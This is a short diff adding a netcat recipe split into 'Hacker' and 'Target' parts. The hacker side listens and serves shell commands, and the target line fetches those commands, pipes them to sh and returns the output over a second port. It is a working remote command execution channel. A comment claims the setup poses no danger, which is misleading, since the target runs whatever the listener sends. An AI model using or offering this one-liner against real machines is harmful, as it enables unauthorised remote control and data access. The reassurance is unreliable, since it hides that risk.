@@ -1,0 +1,17 @@
+#In the name of Allah
+
+#In all applications, set your IP address to 0.0.0.0.
+
+
+#----------Hacker----------
+nc -lp 8500 -s 0.0.0.0 -e sh -c 'echo "ls -lda /etc/" ' && nc -lp 8600
+
+###The command we want is "ls -lda /etc/".
+###Port 8500 is opened on our system, it only specifies commands and does not pose any danger to you.
+###Port 8600 is opened on our system and is used to receive execution reports.
+
+
+
+
+#----------Target----------
+nc 0.0.0.0 8600 -e sh -c "echo $(nc 0.0.0.0 8500 2>/dev/null | sh)"
